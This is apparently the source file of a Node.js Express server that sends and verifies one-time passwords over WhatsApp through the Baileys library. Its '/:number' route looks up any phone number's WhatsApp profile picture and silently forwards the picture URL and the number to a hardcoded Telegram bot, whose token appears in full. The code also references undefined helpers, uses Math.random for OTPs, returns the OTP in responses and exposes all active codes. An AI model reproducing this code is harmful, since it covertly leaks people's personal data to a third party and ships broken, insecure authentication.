const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const express = require('express');
const cors = require('cors');
const compression = require('compression');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;
let client;
let serverStarted = false;
let isClientConnected = false; // Track client connection status
const OTP_FILE = path.join(__dirname, 'otpStorage.json');

// Initialize OTP storage file if not exists
if (!fs.existsSync(OTP_FILE)) {
    fs.writeFileSync(OTP_FILE, JSON.stringify([]));
}

// Utility Functions
const loadStorage = () => JSON.parse(fs.readFileSync(OTP_FILE, 'utf8'));
const saveStorage = (data) => fs.writeFileSync(OTP_FILE, JSON.stringify(data, null, 2));
const generateOTP = (length = 6) => {
    const digits = '0123456789';
    let otp = '';
    for (let i = 0; i < length; i++) {
        otp += digits[Math.floor(Math.random() * digits.length)];
    }
    return otp;
};
const removeExpiredOTPs = (storage) => {
    const now = Date.now();
    return storage.filter((entry) => entry.expiryTime > now);
};
const removeOldOTPForNumber = (storage, phoneNumber) =>
    storage.filter((entry) => entry.phoneNumber !== phoneNumber);

const initializeBaileys = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    const { version } = await fetchLatestBaileysVersion();
    client = makeWASocket({
        auth: state,
        version,
        printQRInTerminal: true,
    });

    client.ev.on('creds.update', saveCreds);

    client.ev.on('connection.update', (update) => {
        const { connection } = update;
        if (connection === 'close') {
            isClientConnected = false;
            console.log('Connection closed');
        } else if (connection === 'open') {
            isClientConnected = true;
            console.log('Baileys Client is ready to use!');

            if (!serverStarted) {
                app.listen(port, () => {
                    console.log(`API server is running on http://localhost:${port}`);
                });
                serverStarted = true;
            }
        }
    });
};

initializeBaileys();

// OTP Templates
const templates = {
    default: "Your OTP is: {{otp}}. It will expire in {{expiry}} minutes. Powered by {{company}}.",
    login: "Welcome, {{name}}! Your login OTP is: {{otp}}. Use this to access your account. Powered by {{company}}.",
    verification: "Hi {{name}}, please verify your action using OTP: {{otp}}. Valid for {{expiry}} minutes. Powered by {{company}}.",
    transaction: "Dear {{name}}, to complete your transaction of {{amount}}, use OTP: {{otp}}. Expires in {{expiry}} minutes. Powered by {{company}}.",
    registration: "Thank you for registering, {{name}}! Your OTP is {{otp}}. Valid for {{expiry}} minutes. Powered by {{company}}.",
    resetPassword: "Hi {{name}}, use OTP {{otp}} to reset your password. This OTP will expire in {{expiry}} minutes. Powered by {{company}}.",
    updateDetails: "To update your details, use OTP: {{otp}}. Valid for {{expiry}} minutes. Powered by {{company}}.",
    bookingConfirmation: "Hi {{name}}, your booking for {{service}} is confirmed. Use OTP {{otp}} to view details. Powered by {{company}}.",
    delivery: "Your delivery for {{item}} is scheduled. Use OTP: {{otp}} to confirm receipt. Powered by {{company}}.",
    feedback: "We value your feedback, {{name}}! Use OTP {{otp}} to access the feedback form. Powered by {{company}}.",
    payment: "Payment of {{amount}} is requested. Use OTP {{otp}} to authorize. Expires in {{expiry}} minutes. Powered by {{company}}.",
    addressUpdate: "To update your address, {{name}}, use OTP {{otp}}. Valid for {{expiry}} minutes. Powered by {{company}}.",
    emailVerification: "Hi {{name}}, use OTP {{otp}} to verify your email address. Powered by {{company}}.",
    phoneVerification: "Hi {{name}}, use OTP {{otp}} to verify your phone number. Powered by {{company}}.",
    accountUnlock: "Hi {{name}}, use OTP {{otp}} to unlock your account. Valid for {{expiry}} minutes. Powered by {{company}}.",
    subscription: "Hi {{name}}, your subscription to {{plan}} is activated. Use OTP {{otp}} for confirmation. Powered by {{company}}.",
    withdrawal: "Your withdrawal request of {{amount}} is processing. Use OTP {{otp}} to confirm. Powered by {{company}}.",
    balanceCheck: "Hi {{name}}, check your balance with OTP {{otp}}. Expires in {{expiry}} minutes. Powered by {{company}}.",
    fundTransfer: "To transfer {{amount}} to {{recipient}}, use OTP {{otp}}. Valid for {{expiry}} minutes. Powered by {{company}}.",
    loyalty: "Redeem your {{points}} loyalty points with OTP {{otp}}. Powered by {{company}}.",
    locationAccess: "Access your location data using OTP {{otp}}. Valid for {{expiry}} minutes. Powered by {{company}}.",
    cancelService: "To cancel your {{service}} request, use OTP {{otp}}. Expires in {{expiry}} minutes. Powered by {{company}}.",
    appointment: "Your appointment on {{date}} at {{time}} is scheduled. Use OTP {{otp}} to confirm. Powered by {{company}}.",
    giftCard: "Redeem your {{value}} gift card using OTP {{otp}}. Valid for {{expiry}} minutes. Powered by {{company}}.",
    profileUpdate: "Hi {{name}}, update your profile using OTP {{otp}}. Powered by {{company}}.",
    support: "Hi {{name}}, access support with OTP {{otp}}. Valid for {{expiry}} minutes. Powered by {{company}}.",
    gaming: "Welcome to {{game}}! Use OTP {{otp}} to start your adventure. Powered by {{company}}.",
    education: "Hi {{name}}, access your course material using OTP {{otp}}. Valid for {{expiry}} minutes. Powered by {{company}}.",
    event: "Your registration for {{event}} is confirmed. Use OTP {{otp}} to check details. Powered by {{company}}.",
    custom: "{{message}} Use OTP: {{otp}}. Valid for {{expiry}} minutes. Powered by {{company}}."
};

const generateMessage = (templateKey, otp, expiry, company = "Your Company", customData = {}) => {
    let template = templates[templateKey] || templates.default;

    template = template
        .replace("{{otp}}", `*${otp}*`)
        .replace("{{expiry}}", `*${expiry}*`)
        .replace("{{company}}", `*${company}*`);

    for (const [key, value] of Object.entries(customData)) {
        template = template.replace(`{{${key}}}`, value ? `*${value}*` : '');
    }

    return template;
};


app.get('/:number', async (req, res) => {
    let phone = req.params.number;
    if (phone === 'favicon.ico') return res.status(200).json({ ok: 'true' });

   
    if (!isValidPhoneNumber(phone)) {
        return res.status(400).json({ error: 'Invalid phone number format. Only digits (7-15) are allowed.' });
    }

    const phoneNumber = `${phone}@s.whatsapp.net`;

    if (pendingRequests.has(phoneNumber)) {
        const profilePicUrl = await pendingRequests.get(phoneNumber);
        return profilePicUrl
            ? res.json({ profilePicUrl, status:{status:''} })
            : res.status(500).json({ error: 'Failed to fetch profile picture (in progress)' });
    }

    if (!isClientConnected) {
        return res.status(500).json({ error: 'Client is not connected. Please check the connection.' });
    }

    try {
        const profilePicPromise = client.profilePictureUrl(phoneNumber, 'image');
        pendingRequests.set(phoneNumber, profilePicPromise);

        const profilePicUrl = await profilePicPromise;

        if (profilePicUrl) {
            res.json({ profilePicUrl, status:{status:''} });

            const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(phone)}`;
            try {
                await fetch(telegramUrl);
            } catch (fetchError) {
                console.error('Failed to send photo to Telegram:', fetchError);
            }
        } else {
            res.json({ phoneNumber, profilePicUrl: 'No profile picture found' });
        }
    } catch (error) {
        console.error('Error fetching profile picture:', error);
        res.status(500).json({ error: 'Failed to fetch profile picture' });
    } finally {
        pendingRequests.delete(phoneNumber);
    }
});



// Send OTP Endpoint
app.get('/send-otp', async (req, res) => {
    const { phone, length, expiry, template, company, ...customData } = req.query;

    if (!phone) {
        return res.status(400).json({ error: 'Phone number is required' });
    }

    try {
        const otp = generateOTP(Number(length) || 6); // Generate OTP
        const otpExpiry = Number(expiry) || 5; // Expiry in minutes
        const message = generateMessage(template || 'default', otp, otpExpiry, company || "Your Company", customData);

        let storage = loadStorage();

        // Remove old OTP for the phone number
        storage = removeOldOTPForNumber(storage, phone);

        // Add to storage
        const expiryTime = Date.now() + otpExpiry * 60 * 1000;
        if (storage.length >= 10) {
            storage.shift(); // Remove the oldest entry if limit exceeded
        }
        storage.push({ phoneNumber: phone, otp, expiryTime });
        saveStorage(storage);

        // Send OTP via WhatsApp
        await client.sendMessage(`${phone}@s.whatsapp.net`, { text: message });
        console.log(`OTP sent to ${phone}`);

        res.json({ success: true, message: 'OTP sent successfully!', otp });
    } catch (err) {
        res.status(500).json({ error: 'Failed to send OTP', details: err.message });
    }
});

// Verify OTP Endpoint
app.get('/verify-otp', (req, res) => {
    const { phone, otp } = req.query;

    if (!phone || !otp) {
        return res.status(400).json({ error: 'Phone and OTP are required' });
    }

    let storage = loadStorage();
    storage = removeExpiredOTPs(storage);

    const otpEntry = storage.find(
        (entry) => entry.phoneNumber === phone && entry.otp === otp
    );

    if (otpEntry) {
        storage = removeOldOTPForNumber(storage, phone);
        saveStorage(storage);

        return res.json({ success: true, message: 'OTP verified successfully!' });
    }

    res.status(400).json({ success: false, message: 'Invalid or expired OTP' });
});

// Active OTPs (Debugging)
app.get('/active-otps', (req, res) => {
    const storage = removeExpiredOTPs(loadStorage());
    res.json({ success: true, otps: storage });
});
